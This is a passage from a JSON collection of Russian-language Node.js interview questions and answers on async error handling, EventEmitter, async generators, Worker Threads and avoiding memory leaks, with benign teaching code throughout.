promise,\n    new Promise((_, reject) =>\n      setTimeout(() => reject(new Error('Timeout')), timeoutMs)\n    )\n  ]);\n}\n\n// Использование\ntry {\n  const user = await withTimeout(\n    fetchUser(1),\n    5000  // 5 секунд\n  );\n  console.log(user);\n} catch (error) {\n  if (error.message === 'Timeout') {\n    console.error('Request took too long');\n  } else {\n    console.error('Request failed:', error);\n  }\n}\n```\n\n**8. Глобальная обработка unhandledRejection:**\n\n```javascript\n// ⚠️ ВАЖНО: всегда обрабатывайте unhandledRejection\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n\n  // Логирование в систему мониторинга\n  logger.error('Unhandled Promise Rejection', {\n    reason,\n    stack: reason?.stack\n  });\n\n  // В production можно завершить процесс\n  // process.exit(1);\n});\n\n// Пример проблемы\nasync function badCode() {\n  throw new Error('Oops');\n}\n\nbadCode();  // ❌ Нет await, нет catch - unhandledRejection!\n\n// ✅ Правильно\nbadCode().catch(error => console.error(error));\n\n// Или\ntry {\n  await badCode();\n} catch (error) {\n  console.error(error);\n}\n```\n\n**9. Error Boundary для async функций:**\n\n```javascript\n// Универсальная обертка для обработки ошибок\nfunction asyncHandler(fn) {\n  return async (req, res, next) => {\n    try {\n      await fn(req, res, next);\n    } catch (error) {\n      next(error);\n    }\n  };\n}\n\n// Использование в Express\napp.get('/users/:id', asyncHandler(async (req, res) => {\n  const user = await getUser(req.params.id);\n  res.json(user);\n  // Не нужно try/catch - asyncHandler обработает!\n}));\n\n// Error handling middleware\napp.use((error, req, res, next) => {\n  console.error(error);\n\n  res.status(error.statusCode || 500).json({\n    error: error.message || 'Internal Server Error'\n  });\n});\n```\n\n**10. Лучшие практики:**\n\n```javascript\n// ✅ ХОРОШО\nasync function goodPractices() {\n  // 1. Всегда используйте try/catch\n  try {\n    const data = await fetchData();\n    return data;\n  } catch (error) {\n    // 2. Логируйте ошибки с контекстом\n    logger.error('Failed to fetch data', {\n      error: error.message,\n      stack: error.stack,\n      timestamp: new Date()\n    });\n\n    // 3. Выбрасывайте или возвращайте fallback\n    throw error;  // или return defaultData;\n  }\n}\n\n// ❌ ПЛОХО - множественные проблемы\nasync function badPractices() {\n  const data = await fetchData();  // Нет try/catch!\n  return data;\n}\n\n// ❌ ПЛОХО - проглатывание ошибок\nasync function swallowingErrors() {\n  try {\n    await fetchData();\n  } catch (error) {\n    // Ничего не делаем - ошибка проглочена!\n  }\n}\n\n// ❌ ПЛОХО - неправильное использование async\nasync function unnecessaryAsync() {\n  return Promise.resolve(42);  // Не нужен async!\n}\n\n// ✅ ХОРОШО\nfunction betterVersion() {\n  return Promise.resolve(42);\n}\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 15,
          "question_number_in_chapter": 5,
          "question_chapter": 2,
          "question_title": "Что такое EventEmitter и когда его использовать?",
          "answer_markdown": "\n**Ответ:**\n\n**EventEmitter** - это класс из модуля `events`, реализующий паттерн **Observer (Наблюдатель)**. Он позволяет объектам подписываться на события и реагировать на них.\n\n**Основы EventEmitter:**\n\n```javascript\nconst EventEmitter = require('events');\n\n// Создание emitter\nconst myEmitter = new EventEmitter();\n\n// Подписка на событие\nmyEmitter.on('event', (arg1, arg2) => {\n  console.log('Event occurred!', arg1, arg2);\n});\n\n// Генерация события\nmyEmitter.emit('event', 'arg1', 'arg2');\n// Вывод: Event occurred! arg1 arg2\n```\n\n**Методы EventEmitter:**\n\n```javascript\nconst EventEmitter = require('events');\nconst emitter = new EventEmitter();\n\n// 1. on() / addListener() - подписка на событие\nemitter.on('data', (data) => {\n  console.log('Received:', data);\n});\n\n// 2. once() - подписка на ОДНО срабатывание\nemitter.once('init', () => {\n  console.log('Initialized!');\n});\nemitter.emit('init');  // 'Initialized!'\nemitter.emit('init');  // Ничего (уже отписался)\n\n// 3. emit() - генерация события\nemitter.emit('data', { id: 1, name: 'John' });\n\n// 4. removeListener() / off() - отписка\nconst callback = (data) => console.log(data);\nemitter.on('log', callback);\nemitter.removeListener('log', callback);\n\n// 5. removeAllListeners() - удалить все подписки\nemitter.removeAllListeners('data');  // Для конкретного события\nemitter.removeAllListeners();        // Для всех событий\n\n// 6. listeners() - получить массив listeners\nconst listeners = emitter.listeners('data');\nconsole.log(listeners.length);\n\n// 7. eventNames() - получить все события\nconsole.log(emitter.eventNames());  // ['data', 'init', 'log']\n\n// 8. listenerCount() - количество listeners\nconsole.log(emitter.listenerCount('data'));\n```\n\n**Создание собственного EventEmitter:**\n\n```javascript\nconst EventEmitter = require('events');\n\n// Наследование от EventEmitter\nclass MyStream extends EventEmitter {\n  constructor() {\n    super();\n    this.data = [];\n  }\n\n  write(chunk) {\n    this.data.push(chunk);\n    this.emit('data', chunk);  // Генерируем событие\n  }\n\n  end() {\n    this.emit('end', this.data);  // Событие завершения\n  }\n}\n\n// Использование\nconst stream = new MyStream();\n\nstream.on('data', (chunk) => {\n  console.log('Received chunk:', chunk);\n});\n\nstream.on('end', (allData) => {\n  console.log('Stream ended. Total data:', allData);\n});\n\nstream.write('Hello');\nstream.write('World');\nstream.end();\n\n// Вывод:\n// Received chunk: Hello\n// Received chunk: World\n// Stream ended. Total data: ['Hello', 'World']\n```\n\n**Практический пример - Database Connection Pool:**\n\n```javascript\nconst EventEmitter = require('events');\n\nclass DatabasePool extends EventEmitter {\n  constructor(maxConnections = 10) {\n    super();\n    this.maxConnections = maxConnections;\n    this.activeConnections = 0;\n    this.queue = [];\n  }\n\n  async connect() {\n    if (this.activeConnections < this.maxConnections) {\n      this.activeConnections++;\n      this.emit('connect', this.activeConnections);\n      return this._createConnection();\n    }\n\n    // Ждем освобождения соединения\n    return new Promise((resolve) => {\n      this.queue.push(resolve);\n      this.emit('queued', this.queue.length);\n    });\n  }\n\n  release(connection) {\n    this.activeConnections--;\n    this.emit('release', this.activeConnections);\n\n    // Если есть ожидающие - выдаем соединение\n    if (this.queue.length > 0) {\n      const resolve = this.queue.shift();\n      this.activeConnections++;\n      resolve(this._createConnection());\n    }\n  }\n\n  _createConnection() {\n    return {\n      id: Math.random(),\n      query: (sql) => console.log('Executing:', sql)\n    };\n  }\n}\n\n// Использование\nconst pool = new DatabasePool(5);\n\npool.on('connect', (count) => {\n  console.log(`Connection opened. Active: ${count}`);\n});\n\npool.on('queued', (count) => {\n  console.log(`Request queued. Queue size: ${count}`);\n});\n\npool.on('release', (count) => {\n  console.log(`Connection released. Active: ${count}`);\n});\n\n// Тестирование\nasync function test() {\n  const conn1 = await pool.connect();  // Connection opened. Active: 1\n  const conn2 = await pool.connect();  // Connection opened. Active: 2\n\n  pool.release(conn1);  // Connection released. Active: 1\n  pool.release(conn2);  // Connection released. Active: 0\n}\n\ntest();\n```\n\n**Обработка ошибок в EventEmitter:**\n\n```javascript\nconst EventEmitter = require('events');\nconst emitter = new EventEmitter();\n\n// ⚠️ ВАЖНО: всегда обрабатывайте 'error' событие!\nemitter.on('error', (error) => {\n  console.error('Error occurred:', error.message);\n});\n\n// Без обработчика 'error' - приложение упадет\nemitter.emit('error', new Error('Something went wrong'));\n\n// В production\nclass SafeEmitter extends EventEmitter {\n  emit(event, ...args) {\n    if (event === 'error' && this.listenerCount('error') === 0) {\n      console.error('Unhandled error event:', args[0]);\n      // Логируем вместо crash\n      return false;\n    }\n    return super.emit(event, ...args);\n  }\n}\n```\n\n**Ограничение количества listeners:**\n\n```javascript\nconst EventEmitter = require('events');\nconst emitter = new EventEmitter();\n\n// По умолчанию максимум 10 listeners (warning если больше)\nemitter.setMaxListeners(20);  // Увеличить лимит\n\n// Или для конкретного emitter\nEventEmitter.defaultMaxListeners = 15;\n\n// Проверка\nfor (let i = 0; i < 15; i++) {\n  emitter.on('data', () => {});\n}\n// Warning: Possible EventEmitter memory leak detected...\n```\n\n**EventEmitter vs Streams:**\n\n```javascript\n// EventEmitter используется в Streams\nconst fs = require('fs');\n\nconst readStream = fs.createReadStream('file.txt');\n\n// Stream это EventEmitter\nreadStream.on('data', (chunk) => {\n  console.log('Chunk:', chunk.toString());\n});\n\nreadStream.on('end', () => {\n  console.log('File read complete');\n});\n\nreadStream.on('error', (error) => {\n  console.error('Read error:', error);\n});\n```\n\n**Когда использовать EventEmitter:**\n\n**✅ Используйте EventEmitter когда:**\n- Объект может генерировать множество событий разных типов\n- Нужна подписка на события с нескольких мест\n- События асинхронные и могут произойти многократно\n- Нужна развязка (decoupling) между компонентами\n\n**Примеры:**\n- Streams (fs, http, net)\n- Серверы (http.Server)\n- Процессы (child_process)\n- Кастомные event-driven компоненты\n\n**❌ НЕ используйте EventEmitter когда:**\n- Нужна простая асинхронная операция (используйте Promise)\n- Событие происходит только один раз (используйте Promise/async-await)\n- Нужна синхронная обработка\n\n**Сравнение EventEmitter vs Promise:**\n\n```javascript\n// EventEmitter - для множественных событий\nconst emitter = new EventEmitter();\n\nemitter.on('progress', (percent) => {\n  console.log(`Progress: ${percent}%`);\n});\n\nemitter.emit('progress', 10);\nemitter.emit('progress', 50);\nemitter.emit('progress', 100);\n\n// Promise - для одного асинхронного результата\nconst promise = new Promise((resolve) => {\n  setTimeout(() => resolve('Done'), 1000);\n});\n\npromise.then(result => console.log(result));\n// Сработает только ОДИН раз\n```\n\n**Memory Leaks с EventEmitter:**\n\n```javascript\n// ❌ ПЛОХО - memory leak\nfunction badPractice() {\n  const emitter = new EventEmitter();\n\n  setInterval(() => {\n    emitter.on('data', () => {\n      // Каждую секунду добавляется новый listener!\n      // Старые не удаляются!\n    });\n  }, 1000);\n}\n\n// ✅ ХОРОШО\nfunction goodPractice() {\n  const emitter = new EventEmitter();\n\n  const handler = () => {\n    // ...\n  };\n\n  emitter.on('data', handler);\n\n  // Cleanup\n  return () => {\n    emitter.removeListener('data', handler);\n  };\n}\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 16,
          "question_number_in_chapter": 6,
          "question_chapter": 2,
          "question_title": "Что такое Async Generators и Async Iterators? Когда их использовать?",
          "answer_markdown": "\n**Ответ:**\n\n**Async Generators** и **Async Iterators** позволяют работать с асинхронными последовательностями данных используя синтаксис `for await...of`.\n\n**Async Iterator:**\n\n```javascript\n// Создание async iterator вручную\nconst asyncIterator = {\n  [Symbol.asyncIterator]() {\n    let i = 0;\n    return {\n      async next() {\n        if (i < 3) {\n          await new Promise(resolve => setTimeout(resolve, 100));\n          return { value: i++, done: false };\n        }\n        return { done: true };\n      }\n    };\n  }\n};\n\n// Использование\nfor await (const value of asyncIterator) {\n  console.log(value);  // 0, 1, 2 (с задержкой)\n}\n```\n\n**Async Generator (более удобный способ):**\n\n```javascript\n// Async generator function\nasync function* asyncGenerator() {\n  let i = 0;\n  while (i < 3) {\n    await new Promise(resolve => setTimeout(resolve, 100));\n    yield i++;\n  }\n}\n\n// Использование\nfor await (const value of asyncGenerator()) {\n  console.log(value);  // 0, 1, 2 (с задержкой)\n}\n```\n\n**Практический пример - пагинация API:**\n\n```javascript\nasync function* fetchAllPages(url) {\n  let page = 1;\n  let hasMore = true;\n\n  while (hasMore) {\n    const response = await fetch(`${url}?page=${page}`);\n    const data = await response.json();\n\n    // Отдаем каждый элемент по одному\n    for (const item of data.items) {\n      yield item;\n    }\n\n    hasMore = data.hasMore;\n    page++;\n  }\n}\n\n// Использование\nfor await (const item of fetchAllPages('/api/users')) {\n  console.log(item);\n  // Обработка по мере получения, не ждем все страницы\n}\n```\n\n**Обработка потока данных:**\n\n```javascript\nconst fs = require('fs');\nconst readline = require('readline');\n\nasync function* readLines(filename) {\n  const fileStream = fs.createReadStream(filename);\n  const rl = readline.createInterface({\n    input: fileStream,\n    crlfDelay: Infinity\n  });\n\n  for await (const line of rl) {\n    yield line;\n  }\n}\n\n// Чтение большого файла построчно\nfor await (const line of readLines('large-file.txt')) {\n  console.log(line);\n  // Обработка по строке, не загружаем весь файл в память\n}\n```\n\n**Pipeline обработки данных:**\n\n```javascript\nasync function* fetchUsers() {\n  const response = await fetch('/api/users');\n  const users = await response.json();\n  for (const user of users) {\n    yield user;\n  }\n}\n\nasync function* filterActive(source) {\n  for await (const user of source) {\n    if (user.active) {\n      yield user;\n    }\n  }\n}\n\nasync function* addFullName(source) {\n  for await (const user of source) {\n    yield {\n      ...user,\n      fullName: `${user.firstName} ${user.lastName}`\n    };\n  }\n}\n\n// Композиция async generators\nasync function processUsers() {\n  const users = fetchUsers();\n  const activeUsers = filterActive(users);\n  const enrichedUsers = addFullName(activeUsers);\n\n  for await (const user of enrichedUsers) {\n    console.log(user);\n  }\n}\n```\n\n**Batch processing:**\n\n```javascript\nasync function* batchProcess(items, batchSize = 10) {\n  const batch = [];\n\n  for await (const item of items) {\n    batch.push(item);\n\n    if (batch.length === batchSize) {\n      yield batch.splice(0, batchSize);\n    }\n  }\n\n  // Отдать оставшиеся\n  if (batch.length > 0) {\n    yield batch;\n  }\n}\n\n// Использование\nasync function* dataSource() {\n  for (let i = 0; i < 100; i++) {\n    yield i;\n  }\n}\n\nfor await (const batch of batchProcess(dataSource(), 10)) {\n  console.log('Processing batch:', batch);\n  // [0,1,2,3,4,5,6,7,8,9]\n  // [10,11,12,13,14,15,16,17,18,19]\n  // ...\n}\n```\n\n**Error handling:**\n\n```javascript\nasync function* fetchWithRetry(urls) {\n  for (const url of urls) {\n    let retries = 3;\n    let lastError;\n\n    while (retries > 0) {\n      try {\n        const response = await fetch(url);\n        const data = await response.json();\n        yield data;\n        break;  // Успех\n      } catch (error) {\n        lastError = error;\n        retries--;\n        await new Promise(r => setTimeout(r, 1000));\n      }\n    }\n\n    if (retries === 0) {\n      // Можно выбросить ошибку или yield специальное значение\n      yield { error: lastError, url };\n    }\n  }\n}\n\n// Использование\nfor await (const result of fetchWithRetry(['/api/1', '/api/2'])) {\n  if (result.error) {\n    console.error('Failed:', result.url);\n  } else {\n    console.log('Success:', result);\n  }\n}\n```\n\n**Async Generator методы:**\n\n```javascript\nasync function* gen() {\n  yield 1;\n  yield 2;\n  yield 3;\n}\n\nconst iterator = gen();\n\n// next() - получить следующее значение\nconst { value, done } = await iterator.next();\nconsole.log(value, done);  // 1, false\n\n// return() - завершить generator\nawait iterator.return('finished');\n// Все последующие next() вернут { done: true }\n\n// throw() - выбросить ошибку в generator\nasync function* genWithError() {\n  try {\n    yield 1;\n    yield 2;\n  } catch (error) {\n    console.error('Caught:', error);\n  }\n}\n\nconst it = genWithError();\nawait it.next();  // { value: 1, done: false }\nawait it.throw(new Error('Stop!'));  // Caught: Error: Stop!\n```\n\n**Когда использовать Async Generators:**\n\n**✅ Используйте когда:**\n- Работа с большими наборами данных (пагинация, файлы)\n- Потоковая обработка данных\n- Бесконечные последовательности\n- Нужна ленивая загрузка (lazy loading)\n- Pipeline обработки\n\n**❌ НЕ используйте когда:**\n- Простая асинхронная операция (используйте Promise)\n- Нужен весь результат сразу (используйте Promise.all)\n- Синхронная итерация достаточна\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 17,
          "question_number_in_chapter": 7,
          "question_chapter": 2,
          "question_title": "Что такое Worker Threads и когда их использовать?",
          "answer_markdown": "\n**Ответ:**\n\n**Worker Threads** - это модуль Node.js (`worker_threads`) который позволяет выполнять JavaScript код в отдельных потоках для CPU-intensive задач.\n\n**Основы Worker Threads:**\n\n```javascript\nconst { Worker } = require('worker_threads');\n\n// Создание worker\nconst worker = new Worker('./worker.js');\n\n// Отправка данных worker'у\nworker.postMessage({ task: 'process', data: [1, 2, 3] });\n\n// Получение результата от worker'а\nworker.on('message', (result) => {\n  console.log('Result:', result);\n});\n\n// Обработка ошибок\nworker.on('error', (error) => {\n  console.error('Worker error:', error);\n});\n\n// Worker завершился\nworker.on('exit', (code) => {\n  if (code !== 0) {\n    console.error(`Worker stopped with exit code ${code}`);\n  }\n});\n```\n\n**Worker файл (worker.js):**\n\n```javascript\nconst { parentPort } = require('worker_threads');\n\n// Получение данных от main thread\nparentPort.on('message', (message) => {\n  const { task, data } = message;\n\n  if (task === 'process') {\n    // Тяжелые вычисления\n    const result = data.reduce((acc, num) => acc + num, 0);\n\n    // Отправка результата обратно\n    parentPort.postMessage(result);\n  }\n});\n```\n\n**Inline Worker (без отдельного файла):**\n\n```javascript\nconst { Worker } = require('worker_threads');\n\nfunction runWorker(workerData) {\n  return new Promise((resolve, reject) => {\n    const worker = new Worker(`\n      const { parentPort, workerData } = require('worker_threads');\n\n      // Тяжелые вычисления\n      const result = workerData.numbers.reduce((acc, n) => acc + n, 0);\n\n      parentPort.postMessage(result);\n    `, {\n      eval: true,  // Выполнить код как строку\n      workerData   // Передать данные\n    });\n\n    worker.on('message', resolve);\n    worker.on('error', reject);\n    worker.on('exit', (code) => {\n      if (code !== 0) {\n        reject(new Error(`Worker exit code ${code}`));\n      }\n    });\n  });\n}\n\n// Использование\nconst result = await runWorker({ numbers: [1, 2, 3, 4, 5] });\nconsole.log(result);  // 15\n```\n\n**Практический пример - обработка изображений:**\n\n```javascript\n// main.js\nconst { Worker } = require('worker_threads');\nconst fs = require('fs');\n\nasync function processImage(imagePath) {\n  return new Promise((resolve, reject) => {\n    const worker = new Worker('./image-worker.js', {\n      workerData: { imagePath }\n    });\n\n    worker.on('message', resolve);\n    worker.on('error', reject);\n  });\n}\n\n// Обработка множества изображений параллельно\nconst images = ['img1.jpg', 'img2.jpg', 'img3.jpg', 'img4.jpg'];\n\nPromise.all(images.map(img => processImage(img)))\n  .then(results => console.log('All images processed:', results));\n```\n\n**Worker файл для обработки изображений:**\n\n```javascript\n// image-worker.js\nconst { workerData, parentPort } = require('worker_threads');\nconst sharp = require('sharp');  // Библиотека для работы с изображениями\n\nasync function processImage() {\n  try {\n    const { imagePath } = workerData;\n\n    // Тяжелая операция - ресайз изображения\n    await sharp(imagePath)\n      .resize(800, 600)\n      .jpeg({ quality: 80 })\n      .toFile(imagePath.replace('.jpg', '-resized.jpg'));\n\n    parentPort.postMessage({ success: true, path: imagePath });\n  } catch (error) {\n    parentPort.postMessage({ success: false, error: error.message });\n  }\n}\n\nprocessImage();\n```\n\n**Worker Pool - пул потоков:**\n\n```javascript\nconst { Worker } = require('worker_threads');\n\nclass WorkerPool {\n  constructor(workerPath, poolSize = 4) {\n    this.workerPath = workerPath;\n    this.poolSize = poolSize;\n    this.workers = [];\n    this.queue = [];\n\n    // Создаем пул workers\n    for (let i = 0; i < poolSize; i++) {\n      this.workers.push({\n        worker: new Worker(workerPath),\n        busy: false\n      });\n    }\n  }\n\n  async execute(data) {\n    return new Promise((resolve, reject) => {\n      // Найти свободного worker\n      const available = this.workers.find(w => !w.busy);\n\n      if (available) {\n        this.runTask(available, data, resolve, reject);\n      } else {\n        // Добавить в очередь\n        this.queue.push({ data, resolve, reject });\n      }\n    });\n  }\n\n  runTask(workerObj, data, resolve, reject) {\n    workerObj.busy = true;\n\n    const onMessage = (result) => {\n      workerObj.busy = false;\n      cleanup();\n      resolve(result);\n\n      // Проверить очередь\n      if (this.queue.length > 0) {\n        const next = this.queue.shift();\n        this.runTask(workerObj, next.data, next.resolve, next.reject);\n      }\n    };\n\n    const onError = (error) => {\n      workerObj.busy = false;\n      cleanup();\n      reject(error);\n    };\n\n    const cleanup = () => {\n      workerObj.worker.removeListener('message', onMessage);\n      workerObj.worker.removeListener('error', onError);\n    };\n\n    workerObj.worker.on('message', onMessage);\n    workerObj.worker.on('error', onError);\n    workerObj.worker.postMessage(data);\n  }\n\n  async terminate() {\n    await Promise.all(\n      this.workers.map(w => w.worker.terminate())\n    );\n  }\n}\n\n// Использование\nconst pool = new WorkerPool('./worker.js', 4);\n\nconst tasks = Array.from({ length: 10 }, (_, i) => i);\n\nPromise.all(tasks.map(task => pool.execute({ number: task })))\n  .then(results => {\n    console.log('All tasks done:', results);\n    return pool.terminate();\n  });\n```\n\n**Shared Memory между threads:**\n\n```javascript\nconst { Worker } = require('worker_threads');\n\n// Создание shared array buffer\nconst sharedBuffer = new SharedArrayBuffer(4);\nconst sharedArray = new Int32Array(sharedBuffer);\n\n// Main thread\nconst worker = new Worker(`\n  const { parentPort, workerData } = require('worker_threads');\n\n  const { sharedArray } = workerData;\n\n  // Атомарные операции\n  Atomics.add(sharedArray, 0, 5);\n\n  parentPort.postMessage('done');\n`, {\n  eval: true,\n  workerData: { sharedArray }\n});\n\nworker.on('message', () => {\n  console.log(sharedArray[0]);  // 5\n});\n```\n\n**Когда использовать Worker Threads:**\n\n**✅ Используйте когда:**\n- CPU-intensive задачи (обработка изображений, видео, криптография)\n- Сложные вычисления (машинное обучение, научные расчеты)\n- Обработка больших объемов данных\n- Задачи блокирующие Event Loop\n\n**❌ НЕ используйте когда:**\n- I/O операции (используйте async/await)\n- Простые операции\n- Нужна shared state (Worker Threads изолированы)\n\n**Worker Threads vs Cluster vs Child Processes:**\n\n| Характеристика | Worker Threads | Cluster | Child Processes |\n|---------------|----------------|---------|-----------------|\n| Изоляция | Легковесная | Полная | Полная |\n| Shared Memory | Да (SharedArrayBuffer) | Нет | Нет |\n| Коммуникация | postMessage (быстро) | IPC (медленно) | IPC/Streams |\n| Use Case | CPU-intensive | Масштабирование HTTP | Изоляция, другие языки |\n\n**Пример - факториал с Worker:**\n\n```javascript\n// Без Worker - блокирует Event Loop\nfunction factorial(n) {\n  if (n === 0) return 1;\n  return n * factorial(n - 1);\n}\n\nconsole.time('blocking');\nconsole.log(factorial(20));  // Блокирует Event Loop\nconsole.timeEnd('blocking');\n\n// С Worker - НЕ блокирует Event Loop\nconst { Worker } = require('worker_threads');\n\nfunction factorialWorker(n) {\n  return new Promise((resolve, reject) => {\n    const worker = new Worker(`\n      const { parentPort, workerData } = require('worker_threads');\n\n      function factorial(n) {\n        if (n === 0) return 1;\n        return n * factorial(n - 1);\n      }\n\n      parentPort.postMessage(factorial(workerData.n));\n    `, {\n      eval: true,\n      workerData: { n }\n    });\n\n    worker.on('message', resolve);\n    worker.on('error', reject);\n  });\n}\n\nconsole.time('non-blocking');\nfactorialWorker(20).then(result => {\n  console.log(result);\n  console.timeEnd('non-blocking');\n});\n\n// Event Loop продолжает работать!\nconsole.log('Event Loop is free!');\n```\n\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 18,
          "question_number_in_chapter": 8,
          "question_chapter": 2,
          "question_title": "Как избежать memory leaks в Node.js при работе с async кодом?",
          "answer_markdown": "\n**Ответ:**\n\n**Memory leaks** в Node.js часто происходят из-за неправильной работы с асинхронным кодом, event listeners и closures.\n\n**1. Неочищенные Event Listeners:**\n\n```javascript\nconst EventEmitter = require('events');\n\n// ❌ ПЛОХО - memory leak\nfunction badPractice() {\n  const emitter = new EventEmitter();\n\n  setInterval(() => {\n    // Каждую секунду добавляем НОВЫЙ listener\n    emitter.on('data', () => {\n      console.log('Processing...');\n    });\n  }, 1000);\n\n  // Listeners накапливаются и не удаляются!\n}\n\n// ✅ ХОРОШО - правильный cleanup\nfunction goodPractice() {\n  const emitter = new EventEmitter();\n  const handler = () => console.log('Processing...');\n\n  emitter.on('data', handler);\n\n  // Cleanup функция\n  return () => {\n    emitter.removeListener('data', handler);\n  };\n}\n\nconst cleanup = goodPractice();\n// Когда больше не нужно\ncleanup();\n```\n\n**2. Незавершенные Promises:**\n\n```javascript\n// ❌ ПЛОХО - Promise никогда не resolve/reject\nfunction memoryLeak() {\n  const promises = [];\n\n  setInterval(() => {\n    promises.push(\n      new Promise((resolve, reject) => {\n        // Забыли вызвать resolve/reject!\n        // Promise висит в памяти вечно\n      })\n    );\n  }, 1000);\n}\n\n// ✅ ХОРОШО - всегда resolve/reject\nfunction noLeak() {\n  setInterval(() => {\n    const promise = new Promise((resolve, reject) => {\n      setTimeout(() => resolve('done'), 1000);\n    });\n\n    promise.then(result => {\n      // Promise завершился и может быть собран GC\n      console.log(result);\n    });\n  }, 1000);\n}\n```\n\n**3. Closures с большими объектами:**\n\n```javascript\n// ❌ ПЛОХО - closure держит большой объект\nfunction processData() {\n  const largeData = new Array(1000000).fill('data');\n\n  return setInterval(() => {\n    console.log(largeData.length);\n    // Closure держит весь largeData в памяти!\n  }, 1000);\n}\n\n// ✅ ХОРОШО - храним только нужное\nfunction processDataCorrect() {\n  const largeData = new Array(1000000).fill('data');\n  const length = largeData.length;  // Копируем только длину\n\n  // largeData может быть собран GC\n  return setInterval(() => {\n    console.log(length);\n  }, 1000);\n}\n```\n\n**4. Глобальные переменные и кэши без ограничений:**\n\n```javascript\n// ❌ ПЛОХО - безлимитный кэш\nconst cache = {};\n\nfunction cacheResult(key, value) {\n  cache[key] = value;  // Растет бесконечно!\n}\n\n// ✅ ХОРОШО - LRU кэш с лимитом\nclass LRUCache {\n  constructor(maxSize = 100) {\n    this.maxSize = maxSize;\n    this.cache = new Map();\n  }\n\n  set(key, value) {\n    // Удаляем старый если существует\n    if (this.cache.has(key)) {\n      this.cache.delete(key);\n    }\n\n    // Добавляем в конец (самый новый)\n    this.cache.set(key, value);\n\n    // Удаляем самый старый если превысили лимит\n    if (this.cache.size > this.maxSize) {\n      const firstKey = this.cache.keys().next().value;\n      this.cache.delete(firstKey);\n    }\n  }\n\n  get(key) {\n    if (!this.cache.has(key)) return undefined;\n\n    const value = this.cache.get(key);\n\n    // Перемещаем в конец (обновляем \"свежесть\")\n    this.cache.delete(key);\n    this.cache.set(key, value);\n\n    return value;\n  }\n}\n\nconst lruCache = new LRUCache(100);\n```\n\n**5. Утечки в Stream обработке:**\n\n```javascript\nconst fs = require('fs');\n\n// ❌ ПЛОХО - stream не закрывается при ошибке\nfunction badStreamHandling() {\n  const stream = fs.createReadStream('file.txt');\n\n  stream.on('data', (chunk) => {\n    // Обработка\n  });\n\n  // Если произойдет ошибка, stream может остаться открытым!\n}\n\n// ✅ ХОРОШО - правильный cleanup\nfunction goodStreamHandling() {\n  const stream = fs.createReadStream('file.txt');\n\n  stream.on('data', (chunk) => {\n    // Обработка\n  });\n\n  stream.on('end', () => {\n    console.log('Stream закрыт');\n  });\n\n  stream.on('error', (error) => {\n    console.error('Ошибка:', error);\n    stream.destroy();  // Явно закрываем stream\n  });\n\n  // Cleanup при необходимости\n  return () => {\n    stream.destroy();\n  };\n}\n```\n\n**6. Таймеры без cleanup:**\n\n```javascript\n// ❌ ПЛОХО - таймеры не очищаются\nclass BadService {\n  start() {\n    setInterval(() => {\n      this.doWork();\n    }, 1000);\n\n    // Таймер продолжит работать даже если объект больше не нужен!\n  }\n\n  doWork() {\n    console.log('Working...');\n  }\n}\n\n// ✅ ХОРОШО - сохраняем ссылку и очищаем\nclass GoodService {\n  constructor() {\n    this.interval = null;\n  }\n\n  start() {\n    this.interval = setInterval(() => {\n      this.doWork();\n    }, 1000);\n  }\n\n  stop() {\n    if (this.interval) {\n      clearInterval(this.interval);\n      this.interval = null;\n    }\n  }\n\n  doWork() {\n    console.log('Working...');\n  }\n}\n\nconst service = new GoodService();\nservice.start();\n// Когда больше не нужно:\nservice.stop();\n```\n\n**7. Circular references в callbacks:**\n\n```javascript\n// ❌ ПЛОХО - циклическая ссылка\nclass BadClass {\n  constructor() {\n    this.data = new Array(1000000).fill('data');\n\n    this.callback = () => {\n      console.log(this.data.length);\n      // callback держит ссылку на this\n      // this держит ссылку на callback\n      // Циклическая ссылка!\n    };\n  }\n}\n\n// ✅ ХОРОШО - разрываем цикл при cleanup\nclass GoodClass {\n  constructor() {\n    this.data = new Array(1000000).fill('data');\n\n    this.callback = () => {\n      console.log(this.data.length);\n    };\n  }\n\n  destroy() {\n    this.callback = null;  // Разрываем ссылку\n    this.data = null;\n  }\n}\n\nconst obj = new GoodClass();\n// Когда больше не нужно:\nobj.destroy();\n```\n\n**8. Инструменты для обнаружения memory leaks:**\n\n```javascript\n// Использование Node.js встроенных инструментов\nconst memwatch = require('@airbnb/node-memwatch');\n\n// Отслеживание утечек памяти\nmemwatch.on('leak', (info) => {\n  console.error('Memory leak detected:', info);\n});\n\n// Heap diff для анализа\nconst hd = new memwatch.HeapDiff();\n\n// ... код который может иметь утечку ...\n\nconst diff = hd.end();\nconsole.log(JSON.stringify(diff, null, 2));\n\n// Также можно использовать:\n// - Chrome DevTools (--inspect flag)\n// - node --heapsnapshot-signal=SIGUSR2 app.js\n// - clinic.js\n```\n\n**9. Heap snapshots:**\n\n```javascript\n// Создание heap snapshot программно\nconst v8 = require('v8');\nconst fs = require('fs');\n\nfunction takeHeapSnapshot() {\n  const filename = `heap-${Date.now()}.heapsnapshot`;\n  const snapshot = v8.writeHeapSnapshot(filename);\n  console.log('Snapshot saved:', snapshot);\n  return snapshot;\n}\n\n// Сравнение heap snapshots для поиска утечек\nconst before = takeHeapSnapshot();\n\n// ... код который может иметь утечку ...\n\nconst after = takeHeapSnapshot();\n\n// Анализ в Chrome DevTools:\n// 1. Загрузить оба snapshot\n// 2. Сравнить\n// 3. Найти объекты которые выросли\n```\n\n**10. Best Practices:**\n\n```javascript\n// ✅ Используйте WeakMap/WeakSet для временных ассоциаций\nconst cache = new WeakMap();  // Автоматическая очистка\n\nfunction attachMetadata(obj, metadata) {\n  cache.set(obj, metadata);\n  // Когда obj будет собран GC, metadata тоже удалится\n}\n\n// ✅ Очищайте listeners при unmount/destroy\nclass Component {\n  constructor() {\n    this.handlers = [];\n  }\n\n  addListener(emitter, event, handler) {\n    emitter.on(event, handler);\n    this.handlers.push({ emitter, event, handler });\n  }\n\n  destroy() {\n    // Очистка всех listeners\n    this.handlers.forEach(({ emitter, event, handler }) => {\n      emitter.removeListener(event, handler);\n    });\n    this.handlers = [];\n  }\n}\n\n// ✅ Используйте AbortController для отмены запросов\nconst controller = new AbortController();\n\nfetch('/api/data', { signal: controller.signal })\n  .then(response => response.json())\n  .catch(error => {\n    if (error.name === 'AbortError') {\n      console.log('Request 